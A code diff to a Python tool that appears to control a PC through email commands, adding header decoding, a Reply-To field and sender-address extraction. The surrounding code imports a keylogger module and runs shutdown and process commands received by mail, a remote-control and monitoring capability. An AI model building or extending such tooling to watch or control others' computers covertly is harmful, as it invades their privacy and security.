@@ -15,6 +15,7 @@ import shutdown
 from process_app import execute_msg
 from keylogger import key_logger
 from rd import Email
+from email.header import decode_header
 
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
 smtp_port = 587  # Port for TLS
@@ -33,13 +34,12 @@ def send_email(sender, receiver, subject, body, image_data=None):
     msg["From"] = sender
     msg["To"] = receiver
     msg["Subject"] = subject
+    msg["Reply-To"] = sender  # Thêm trường Reply-To
     msg.attach(MIMEText(body, "plain"))
-    
     if image_data is not None:
         image = MIMEImage(image_data, name="image.png")
         msg.attach(image)
-    
-    text = msg.as_string()    
+    text = msg.as_string()
     server = smtplib.SMTP('smtp.gmail.com', 587)
 
     try:
@@ -50,6 +50,7 @@ def send_email(sender, receiver, subject, body, image_data=None):
         print(f"Error sending email: {e}")
     finally:
         server.quit()
+
 
 # READ MAIL
 def CheckAndDo(cmd):
@@ -79,10 +80,28 @@ def CheckAndDo(cmd):
                    "Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
 
+def decode_email_header(header):
+    decoded_parts = []
+    for part, encoding in decode_header(header):
+        if isinstance(part, bytes):
+            decoded_parts.append(part.decode(encoding or 'utf-8'))
+        else:
+            decoded_parts.append(part)
+    return ''.join(decoded_parts)
+
+def extract_email_address(sender):
+    # Assuming the email address is within angle brackets
+    start = sender.find('<')
+    end = sender.find('>')
+    if start != -1 and end != -1:
+        return sender[start + 1:end]
+    else:
+        return sender
+
 def save_emails_to_json(emails, file_path):
     with open(file_path, 'w', encoding='utf-8') as file:
         data = [
-            {"sender": email.sender, "subject": email.subject, "snippet": email.snippet, "read": email.read}
+            {"sender": extract_email_address(email.sender), "subject": email.subject, "snippet": email.snippet, "read": email.read}
             for email in emails
         ]
         json.dump(data, file, ensure_ascii=False, default=str)
